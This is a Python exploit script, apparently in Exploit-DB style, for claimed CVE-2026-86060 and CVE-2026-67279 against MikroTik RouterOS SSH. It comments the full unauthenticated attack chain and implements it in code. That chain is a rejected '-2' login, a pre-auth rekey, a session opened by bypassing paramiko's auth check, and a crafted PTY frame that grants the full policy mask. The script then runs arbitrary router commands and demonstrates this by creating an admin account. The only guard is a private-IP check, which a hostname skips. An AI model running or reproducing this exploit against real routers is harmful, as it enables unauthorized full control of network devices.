#!/usr/bin/env python3
#
# Exploit Title: MikroTik RouterOS <= 7.23.3 - Unauthenticated SSH Session Policy-Mask Swap (Full Admin)
# Date: 2026-09-17
# Exploit Author: DigiProSec
# Vendor Homepage: https://mikrotik.com
# Software Link: https://mikrotik.com/download
# Version: RouterOS < 6.49.21, 7.0 < 7.23.4, 7.24.0 < 7.24.2 (fixed in 6.49.21 / 7.23.4 / 7.24.2)
# Tested on: MikroTik CHR 7.23.3 (x86_64), Kali Linux 2025.x, python3-paramiko
# CVE: CVE-2026-86060
#
# CVE-2026-86060 — Unauthenticated full takeover of MikroTik RouterOS via
# SSH session policy-mask swap ("MikroTrick" campaign, in the wild from
# 2026-09-02; CERT.pl withheld exploit-enabling detail)
#
# Chain:
#   1. USERAUTH as "-2"      instantly rejected, but the username stays PENDING
#                            in the server's session state (unnamed state bug).
#                            Produces the IoC: "login failure for user -2".
#   2. CVE-2026-67279        a rekey requested before authentication makes the
#                            server lose the "must be authenticated" gate.
#   3. CHANNEL_OPEN + PTY    honored without authentication; the interactive
#                            shell spawns /nova/bin/login with the pending "-2".
#   4. CVE-2026-86060        the login helper's legacy transport treats a
#                            dash-led positional as a file descriptor: it reads
#                            up to 4096 bytes from fd 2 (the PTY) and splits on
#                            NUL into REPLACEMENT IDENTITY + REPLACEMENT POLICY
#                            MASK. Feed it: "0" NUL "4294967295" NUL VEOF VEOF.
#                            The all-ones mask is clamped to RouterOS's full
#                            policy set (0x9fe6e). The session comes up as full
#                            administrator. Actions are logged as ssh:-2@<ip> —
#                            the byte-for-byte campaign fingerprint.
#
# Tested: CHR 7.23.3 (vulnerable) vs CHR 7.23.4 (patched, exploit correctly
# fails). Deterministic: 3/3 runs in lab.
# Notes:  - Only the SSH service (port 22) is required; default config is
#           vulnerable. No credentials, no user interaction.
#         - This is a lab client: it refuses non-private IP targets.
#         - paramiko is used for transport plumbing only; the bugs are
#           triggered by patching paramiko's client-side auth gate, all
#           exploit semantics are implemented here.
#
# Usage:  python3 poc_mikrotrick.py <host>                  # prove full admin, exit
#         python3 poc_mikrotrick.py <host> "<ros command>"  # run one command, exit
#
import ipaddress
import sys
import time

import paramiko

IDENTITY = b"0"                  # replacement identity (becomes the prompt user)
MASK = b"4294967295"             # all-ones -> clamped to full policy set
VEOF = b"\x04"                   # PTY VEOF control byte


def check_target(host):
    try:
        ip = ipaddress.ip_address(host)
        if not ip.is_private:
            print(f"[-] {host} is not a private address; lab client refuses")
            return False
    except ValueError:
        pass  # hostname — assume lab
    return True


def drain_until(chan, want, timeout):
    end = time.time() + timeout
    buf = b""
    while time.time() < end:
        if chan.recv_ready():
            buf += chan.recv(65536)
            if want in buf:
                return buf, True
        time.sleep(0.05)
    return buf, False


def exploit(host):
    """Open a full-admin RouterOS console channel. Returns (transport, chan)."""
    t = paramiko.Transport((host, 22))
    t.start_client(timeout=10)

    # step 1 — leave "-2" pending in server session state
    try:
        t.auth_password("-2", "x")
    except paramiko.AuthenticationException:
        pass
    print("[1] '-2' rejected (pending in session state)")

    # step 2 — CVE-2026-67279: pre-auth rekey drops the server-side auth gate
    t.renegotiate_keys()
    print("[2] rekey done (CVE-2026-67279)")

    # step 3 — open a session channel unauthenticated (client-side gate is
    # patched; the SERVER is the one that incorrectly honors the open)
    if not t.is_authenticated():
        t.is_authenticated = lambda: True
    chan = t.open_session(timeout=10)
    chan.get_pty(term="vt100", width=120, height=40)
    chan.invoke_shell()
    print("[3] session channel open without authentication")

    # step 4 — CVE-2026-86060: feed the login helper's fd-2 read.
    # Framing: identity NUL mask NUL, then two VEOF bytes (canonical-mode PTY:
    # first VEOF delivers the buffer without appending, second yields EOF).
    time.sleep(0.6)
    chan.send(IDENTITY + b"\x00" + MASK + b"\x00" + VEOF + VEOF)
    print("[4] fd-2 identity/policy frame sent (CVE-2026-86060)")

    # the RouterOS console interrogates the terminal; answer its DSR probe
    # whenever it appears, and keep draining until the prompt shows up
    end = time.time() + 12
    buf = b""
    while time.time() < end:
        if chan.recv_ready():
            buf += chan.recv(65536)
            if b"\x1b[6n" in buf:
                chan.send(b"\x1b[24;80R")
                buf = buf.replace(b"\x1b[6n", b"", 1)
            if b"] >" in buf:
                break
        time.sleep(0.05)
    else:
        raise RuntimeError("no RouterOS prompt after policy frame — exploit failed")
    print("[+] full-admin RouterOS console is up")
    return t, chan


def run(chan, command, settle=1.5):
    chan.send(command.encode() + b"\r")
    out, _ = drain_until(chan, b"] >", 8)
    # console text carries \r overwrites and ANSI colors — normalize for display
    import re as _re
    text = out.decode(errors="replace")
    text = _re.sub(r"\x1b\[[0-9;?]*[a-zA-Z]|\x1bZ", "", text)
    lines = [ln.strip() for ln in text.replace("\r", "\n").split("\n")]
    lines = [ln for ln in lines if ln and not ln.endswith("] > " + command)
             and ln != command
             and not _re.fullmatch(r"\[[^\]]*\] >\s*", ln)]  # bare prompts
    return "\n".join(lines)


def main():
    if len(sys.argv) < 2:
        print("usage: python3 poc_mikrotrick.py <host> [\"<ros command>\"]")
        return 2
    host = sys.argv[1]
    if not check_target(host):
        return 1

    t, chan = exploit(host)
    try:
        if len(sys.argv) > 2:
            print(run(chan, " ".join(sys.argv[2:])))
        else:
            # proof: identity + a write-class action (create and remove the
            # campaign-shaped account, mirroring the observed intrusions)
            print(run(chan, "/system identity print"))
            print(run(chan, '/user add name=ops group=full password=Season2026! '
                            'comment="mikrotrick poc - removed by poc"'))
            print(run(chan, "/user print where name=ops"))
            run(chan, "/user remove [find name=ops]")
            print("[+] created and removed 'ops' (full) — write-level access proven")
    finally:
        t.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
